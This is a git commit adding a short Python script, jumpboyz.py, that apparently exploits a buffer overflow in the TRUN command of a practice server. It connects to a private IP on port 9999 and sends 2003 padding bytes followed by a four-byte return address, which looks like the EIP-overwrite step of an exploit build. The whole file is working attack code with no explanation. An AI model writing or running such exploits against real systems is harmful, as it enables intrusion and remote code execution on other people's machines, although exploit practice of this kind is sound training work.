1aadf56f338fa94d45f56c2be4331b12152535cb
planetxort <39013067+planetxort@users.noreply.github.com>
2020-06-19 20:36:45 -0600

    Create jumpboyz.py

---
+++ jumpboyz.py
@@ -0,0 +1,14 @@
+#!/usr/bin/python
+import sys, socket
+
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
+
+try:
+       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+       s.connect(('10.0.0.71',9999))
+       s.send(('TRUN /.:/' + shellcode))
+       s.close()
+
+except:
+       print "Error connecting to server"
+       sys.exit()
